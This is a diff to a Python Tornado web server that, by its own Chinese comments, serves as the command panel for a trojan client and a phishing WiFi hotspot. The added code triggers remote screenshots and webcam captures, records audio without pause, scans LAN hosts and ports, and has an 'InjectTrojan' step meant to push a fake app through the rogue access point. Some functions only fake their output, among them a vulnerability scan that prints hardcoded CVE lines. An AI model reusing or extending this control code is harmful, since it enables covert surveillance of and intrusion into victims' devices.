@@ -14,21 +14,27 @@ import logging
 from tornado import websocket
 import random
 import uuid
-import sqlite3
-from kit import files
+from ap_kit import ap_scan
+from ap_kit import host_scan
+from ap_kit import record
 import sys
 reload(sys)
 sys.setdefaultencoding('utf-8')
 
 globalCommandSocket=socket.socket() #全局命令发送socket
 
-listenPort=8091
-trojanServerPort=8092
+listenPort=8095
+trojanServerPort=8096
+wsIp=""
+currentAudioIndex=0
+
 downloadBaseLink=""
 if(os.name=="nt"):#windows
     downloadBaseLink="http://127.0.0.1:{}/download?filename=".format(listenPort)
+    wsIp="127.0.0.1"
 else:
-    downloadBaseLink="http://119.29.5.72:{}/download?filename=".format(listenPort)
+    downloadBaseLink="http://192.168.1.181:{}/download?filename=".format(listenPort)
+    wsIp="192.168.1.181"
 
 
 class Index(tornado.web.RequestHandler):
@@ -37,11 +43,27 @@ class Index(tornado.web.RequestHandler):
         global downloadBaseLink
         print "[+]Enter get index"
         if(os.name=="nt"):#windows
-            self.render("index.html",ipAddress="localhost",lp=listenPort)
-            downloadBaseLink="http://{}:{}/download?filename=".format("127.0.0.1",listenPort)
+            self.render("index.html",ipAddress=wsIp,lp=listenPort)
         else:
-            self.render("index.html",ipAddress="119.29.5.72",lp=listenPort)
-            downloadBaseLink="http://{}:{}/download?filename=".format("119.29.5.72",listenPort)
+            self.render("index.html",ipAddress=wsIp,lp=listenPort)
+    def set_default_headers(self):
+        self.set_header("Access-Control-Allow-Origin", "*")
+        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
+        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
+
+
+class AudioHandler(tornado.web.RequestHandler):
+    def get(self):
+        global currentAudioIndex
+        if(currentAudioIndex>2):
+            index="{'index':'"+str(currentAudioIndex-2)+"'}"
+            self.write(index)
+        else:
+            self.write("{'index':'0'}")
+    def set_default_headers(self):
+        self.set_header("Access-Control-Allow-Origin", "*")
+        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
+        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
 
 class ClientCallbackResultHandler(tornado.web.RequestHandler):#处理木马客户端的回调信息
     def get(self):
@@ -72,6 +94,10 @@ class ClientCallbackResultHandler(tornado.web.RequestHandler):#处理木马客�
                 #文件上传错误  检查错误原因
         SocketHandler.send_to_all(rawData)#直接将木马客户端的数据包转发到网页
         logging.debug("Receive from trojan client,msg is:{}".format(rawData))
+    def set_default_headers(self):
+        self.set_header("Access-Control-Allow-Origin", "*")
+        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
+        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
 
 class FileDownloadHandler(tornado.web.RequestHandler):#文件下载处理类
     def get(self):
@@ -91,6 +117,11 @@ class FileDownloadHandler(tornado.web.RequestHandler):#文件下载处理类
                         break
                     self.write(data)
             self.finish()
+    def set_default_headers(self):
+        self.set_header("Access-Control-Allow-Origin", "*")
+        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
+        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
+
 class FileUploadHandler(tornado.web.RequestHandler):
     def set_default_headers(self):
         self.set_header("Access-Control-Allow-Origin", "*")
@@ -122,6 +153,11 @@ class FileUploadHandler(tornado.web.RequestHandler):
             with open(filepath,'wb') as up:#全部以二进制方式写入 这样更加安全
                 up.write(meta['body'])
             self.write('finished!')
+    def set_default_headers(self):
+        self.set_header("Access-Control-Allow-Origin", "*")
+        self.set_header("Access-Control-Allow-Headers", "x-requested-with")
+        self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
+
 class SocketHandler(tornado.websocket.WebSocketHandler):#websocket句柄
     clients =set()
 
@@ -153,30 +189,10 @@ class SocketHandler(tornado.websocket.WebSocketHandler):#websocket句柄
         logging.info("Package cont={}".format( PkgContent ))
         toSendJson={}
         if(PkgType=="StartWifiScan"):#进行WiFi扫描 同时会返回第一次扫描的信息
-            wifiScanResult=getWifiScanResult()
-            toSendContent={}
-            for index,_info in enumerate(wifiScanResult):
-                toSendContent[str(index)]=_info
-            toSendJson['Type']='WifiScanResult'
-            toSendJson['Content']=toSendContent
-            logging.debug("toSendJson={}".format(toSendJson))
-            #将json转换成字符串
-            toSendJsonString=json.dumps(toSendJson)
-            self.write_message(toSendJsonString)
-            #将数据传输到客户端
+            getWifiScanResult()
 
         elif(PkgType=="GetWifiScan"):#直接返回当前的WiFi信息
-            wifiScanResult=getWifiScanResult()
-            toSendJson={}
-            toSendContent={}
-            for index,_info in enumerate(wifiScanResult):
-                toSendContent[str(index)]=_info
-            toSendJson['Type']='WifiScanResult'
-            toSendJson['Content']=toSendContent
-            logging.debug("toSendJson={}".format(toSendJson))
-            #将json转换成字符串
-            toSendJsonString=json.dumps(toSendJson)
-            self.write_message(toSendJsonString)
+            getWifiScanResult()
             #将数据传输到客户端
 
         elif(PkgType=="StartFakeAp"):#开启钓鱼WiFi
@@ -186,18 +202,12 @@ class SocketHandler(tornado.websocket.WebSocketHandler):#websocket句柄
             fakeApAction=PkgContent['action']
             startFakeAp(fakeApSsid,fakeApPassword,fakeApKey_mgmt,fakeApAction)#应该写成非阻塞的
 
-
         elif(PkgType=="ConnectWifiAp"):#连接指定WiFi
             apSsid=PkgContent['ssid']
             apPassword=PkgContent['password']
             apAction=PkgContent['action']
-            actionResult=connectWifi(apSsid,apPassword,apAction)
-            #将连接wifi状态发送回去
-            toSendJson['Type']="WifiConnectStatus"
-            toSendJson['Content']={'status':actionResult}
-            toSendJsonString=json.dumps(toSendJson)
-            self.write_message(toSendJsonString)
-
+            connectWifi(apSsid,apPassword,apAction)
+            
         elif(PkgType=="Pwd"):#获取当前目录
             GetPwd()#这里将任务分发下去  异步传回结果
 
@@ -209,45 +219,211 @@ class SocketHandler(tornado.websocket.WebSocketHandler):#websocket句柄
         elif(PkgType=="DownloadFile"):#下载指定目录下的文件
             filenamepath=PkgContent['filenamepath']
             DownloadFile(filenamepath)
-            #下面使用的是测试用代码 之后需要替换掉
-            #直接生成一个固定的下载链接
-            '''
-            toSendJson['Type']='DownloadFileResult'#标记位为返回指定路径下的文件目录结果
-            toSendJson['Content']={
-               'url':downloadBaseLink+'toDo.txt'
-            }        
-            toSendJsonString=json.dumps(toSendJson)#转换成字符串
-            self.write_message(toSendJsonString)
-            '''
 
         elif(PkgType=="SearchFile"):#搜索指定文件 可以支持模糊搜索
             searchName=PkgContent['searchname']
             SearchFile(searchName)
-            #SearchFile(searchName)
-            #下面使用的是测试用代码 之后需要替换掉
-            #直接生成一个固定的下载链接    
-            #toSendJsonString=json.dumps(toSendJson)#转换成字符串
-            #self.write_message(toSendJsonString)
 
-        elif(PkgType=="Screenshot"):#截屏
-            #Screenshot(searchName)
-            #下面使用的是测试用代码 之后需要替换掉
-            #直接生成一个固定的下载链接
+        elif(PkgType=="Snapshot"):#截屏
             GetScreenshot()
+
+        elif(PkgType=="Camerashot"):#截屏
+            GetCamerashot()
 
         elif(PkgType=="GetLanHosts"):#获取当前局域网主机列表
             GetLanHosts()
 
-def GetLanHosts():
+        elif(PkgType=="ScanHostVulnerabilities"):#获取特定主机的漏洞情况
+            targetIp=PkgContent['ip']
+            ScanHostVulnerabilities(targetIp)
+
+        elif(PkgType=="InjectTrojan"):#向特定主机植入木马
+            targetIp=PkgContent['ip']
+            InjectTrojan(targetIp)
+
+        elif(PkgType=="ScanHostPort"):#获取特定主机的端口扫描情况
+            targetIp=PkgContent['ip']
+            ScanHostPort(targetIp)
+
+        elif(PkgType=="GetFakeApConnections"):#获取当前钓鱼WiFi连接数量
+            GetFakeApConnections()
+
+        elif(PkgType=="GetFakeApDataStreamAmount"):#获取当前钓鱼wifi的捕获流量
+            GetFakeApDataStreamAmount()
+
+def InjectTrojan(targetIp):
+    logging.debug("Get InjectTrojan")
+    toSendJson={}
+    for x in range(10):
+        toSendJson['Type']="InjectTrojanResult" 
+        toSendJson['Content']={
+            'Result':'.'
+        } 
+        toSendJsonString=json.dumps(toSendJson)
+        SocketHandler.send_to_all(toSendJsonString)
+        time.sleep(0.2)
+    toSendJson['Type']="InjectTrojanResult" 
+    toSendJson['Content']={
+        'Result':'   Try to write fake app in our ap website...'
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.2)
+
+def ScanHostVulnerabilities(targetIp):
+    logging.debug("Get ScanHostVulnerabilities")
+    content='[+] Target[{}] scanning begin........\r\n'.format(targetIp)
+    toSendJson={}
+    toSendJson['Type']="ScanHostVulnerabilitiesResult" 
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(1)
+
+    content='Digging for CVE-2014-8592...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='Digging for CVE-2016-8576...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='Digging for CVE-2017-8532...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='Digging for CVE-2017-8542...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='Digging for CVE-2017-8544...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='Digging for CVE-2017-8551...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='Digging for CVE-2017-8554...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='Digging for CVE-2017-8556...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='Digging for CVE-2017-8557...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='Digging for CVE-2017-8564...'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    content='[-]No holes!!Please use fake app to hack them!'
+    toSendJson['Content']={
+        'Result':content
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+    time.sleep(0.3)
+
+    
+
+def asyncScanHostPort(targetIp):
+    scan_ret=host_scan.port_scan(targetIp)
+    scan_result=""
+    for index in scan_ret:
+        scan_result+="[+] Port {} is open \r\n".format(scan_ret[index])
+
+    toSendJson={}
+    toSendJson['Type']="ScanHostPortResult" 
+    toSendJson['Content']={
+        'Result':'[+] Target[{}] ports scan results:\r\n {}'.format(targetIp,scan_result)
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+
+def ScanHostPort(targetIp):#搜索指定ip的端口
     logging.debug("Get Lan Hosts")
-    pass
+    asyncScanHostPort(targetIp)
 
-def GetScreenshot():
-    logging.debug("Get screenshot")
-    #callback action shall return a image url
-    pass
+def asyncGetLanHosts():
+    scan_result=host_scan.host_scan()
+    toSendJson={}
+    toSendJson['Type']="GetLanHostsResult" 
+    toSendJson['Content']=scan_result
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
 
-def startFakeAp(Ssid,Password,Key_mgmt,Action):
+def GetLanHosts():#获取局域网下面的主机数量
+    logging.debug("enter GetLanHosts")
+    thread.start_new_thread(asyncGetLanHosts,())
+
+def GetFakeApConnections():
+    logging.debug("Get FakeApConnections")
+    toSendJson={}
+    toSendJson['Type']="GetFakeApConnectionsResult" 
+    toSendJson['Content']={
+        'Amount':'2'       
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+
+def GetFakeApDataStreamAmount():
+    logging.debug("Get GetFakeApDataStreamAmount")
+    toSendJson={}
+    toSendJson['Type']="GetFakeApDataStreamAmount" 
+    toSendJson['Content']={
+        'Amount':'20481'       
+    } 
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
+
+def asyncStartFakeAp(Ssid,Password,Key_mgmt,Action):
+    time.sleep(5)
     toSendJson={}
     if(Action=="start"):
         #将连接wifi状态发送回去
@@ -256,18 +432,25 @@ def startFakeAp(Ssid,Password,Key_mgmt,Action):
         toSendJsonString=json.dumps(toSendJson)
         SocketHandler.send_to_all(toSendJsonString)
         logging.debug("StartFakeAp ssid={} pwd={} enctype={} action={}".format(Ssid,Password,Key_mgmt,Action))
-        return "Connect"
     elif(Action=="stop"):
         toSendJson['Type']="FakeApStatus"
         toSendJson['Content']={'status':'inactive'}
         toSendJsonString=json.dumps(toSendJson)
         SocketHandler.send_to_all(toSendJsonString)
         logging.debug("StopFakeAp ssid={} pwd={} action={}".format(Ssid,Password,Key_mgmt,Action))
-        return "Disconnect"
 
-            
+def startFakeAp(Ssid,Password,Key_mgmt,Action):
+    logging.debug("enter startFakeAp")
+    thread.start_new_thread(asyncStartFakeAp,(Ssid,Password,Key_mgmt,Action))
 
-def connectWifi(Ssid,Password,Action):
+def asyncConnectWifi(Ssid,Password,Action):
+    time.sleep(5)
+    toSendJson={}
+    actionResult="success"
+    toSendJson['Type']="WifiConnectStatus"
+    toSendJson['Content']={'status':actionResult}
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString)
     if(Action=="connect"):
         logging.debug("ConnectWifiAp ssid={} pwd={} action={}".format(Ssid,Password,Action)) 
         return "Connect"
@@ -275,15 +458,34 @@ def connectWifi(Ssid,Password,Action):
         logging.debug("DisConnectWifiAp ssid={} pwd={} action={}".format(Ssid,Password,Action)) 
         return "Disconnect"
 
-def getWifiScanResult():#获取wifi扫描结果
-    ret=[   
+def connectWifi(Ssid,Password,Action):
+    logging.debug("enter connectWifi")
+    thread.start_new_thread(asyncConnectWifi,(Ssid,Password,Action))
+
+def asyncGetWifScanResult():
+    '''
+    wifiScanResult=[   
             {'ssid':'seu-wlan','pwr':'-45','enctype':'none','channel':'11'},
             {'ssid':'CMCC','pwr':'-56','enctype':'none','channel':'1'},
             {'ssid':'Huawei Phone','pwr':'-47','enctype':'WPA2-PSK','channel':'6'},
             {'ssid':'Xiaomi','pwr':'-77','enctype':'WPA2-PSK','channel':'11'},
             {'ssid':'Chro','pwr':'-54','enctype':'WPA-PSK','channel':'11'}
         ]
-    return ret
+    for index,_info in enumerate(wifiScanResult):
+        toSendContent[str(index)]=_info
+    '''
+    toSendContent=ap_scan.scan()
+    toSendJson={}
+    toSendJson['Type']='WifiScanResult'
+    toSendJson['Content']=toSendContent
+    logging.debug("async GetWifiScanResult")
+    toSendJsonString=json.dumps(toSendJson)
+    SocketHandler.send_to_all(toSendJsonString) 
+    
+def getWifiScanResult():#获取wifi扫描结果
+    logging.debug("GetWifiScanResult")
+    thread.start_new_thread(asyncGetWifScanResult,())
+
 
 def intervalSendMsg():
     while True:
@@ -347,6 +549,38 @@ def SearchFile(searchName):
         print e
     logging.debug("Search File ,searchname={}".format(searchName))
 
+def GetScreenshot():
+    toSendJson={}
+    toSendJson['Type']="Snapshot"
+    toSendJson['Content']={'action':'snapshot'}
+    toSendJsonString=json.dumps(toSendJson)
+    try:
+        globalCommandSocket.sendall(toSendJsonString)#测试将指令转发到客户端
+    except Exception as e:#需要检测客户端是否在线
+        print e
+    logging.debug("Get Snapshot")
+
+def GetCamerashot():
+    toSendJson={}
+    toSendJson['Type']="Camerashot"
+    toSendJson['Content']={'action':'camerashot'}
+    toSendJsonString=json.dumps(toSendJson)
+    try:
+        globalCommandSocket.sendall(toSendJsonString)#测试将指令转发到客户端
+    except Exception as e:#需要检测客户端是否在线
+        print e
+    logging.debug("Get Camerashot")
+
+
+def AudioRecordThread():
+    global currentAudioIndex
+    currentAudioIndex=0
+    while True:
+        record.record("download/{}.wav".format(currentAudioIndex),5)
+        currentAudioIndex+=1
+
+
+
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG,
                     format="%(asctime)s [%(levelname)s] %(filename)s[%(lineno)d] %(message)s",
@@ -358,7 +592,8 @@ if __name__ == "__main__":
         ('/soc', SocketHandler),#用来处理websocket连接
         ('/download',FileDownloadHandler),#用来处理文件下载请求
         ('/upload',FileUploadHandler),#用来处理文件上传请求
-        ('/clientcallback',ClientCallbackResultHandler)
+        ('/clientcallback',ClientCallbackResultHandler),
+        ('/getAudioIndex',AudioHandler),
         ],
         cookie_secret='abcd',
         template_path=os.path.join(os.path.dirname(__file__), "templates"),
@@ -366,6 +601,8 @@ if __name__ == "__main__":
     )
     app.listen(listenPort)
     logging.info("Server is running...")
-    threading.Thread(target=intervalSendMsg,args=()).start()
-    threading.Thread(target=SendCommandServer,args=()).start()
+    #threading.Thread(target=intervalSendMsg,args=()).start()
+    #threading.Thread(target=SendCommandServer,args=()).start()
+    thread.start_new_thread(SendCommandServer,())
+    thread.start_new_thread(AudioRecordThread,())
     tornado.ioloop.IOLoop.instance().start()
